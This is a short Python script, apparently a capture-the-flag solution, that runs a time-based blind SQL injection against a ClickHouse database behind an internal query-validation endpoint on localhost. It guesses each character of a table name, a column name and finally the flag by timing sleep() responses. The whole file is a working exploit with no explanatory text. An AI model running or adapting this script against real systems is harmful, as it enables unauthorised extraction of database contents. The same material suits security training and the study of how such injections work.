import requests
import string

def brute(column_name, table, where_cond = ''):
  where_clause = 'WHERE ' + where_cond if where_cond else ''

  value = ''
  found = True
  while found:
    found = False
    for c in (string.ascii_lowercase + string.ascii_uppercase + string.digits + "_{}$!?"):
      query = f"SELECT if(startsWith({column_name}, '{value + c}'), sleep(0.1), 1) FROM {table} {where_clause} LIMIT 1 OFFSET 0"
      response = requests.post('http://localhost:80/internal/test_query_validity', json={'query': query})

      if response.elapsed.total_seconds() >= 0.1:
        value += c
        found = True
        break

  return value

table = brute('name', 'system.tables', "database = 'default'")
print(f"Table found: {table}")

column = brute('name', 'system.columns', f"database = 'default' and table = '{table}'")
print(f"Column found: {column}")

flag = brute(column, f"default.{table}")
print(f"Flag: {flag}")
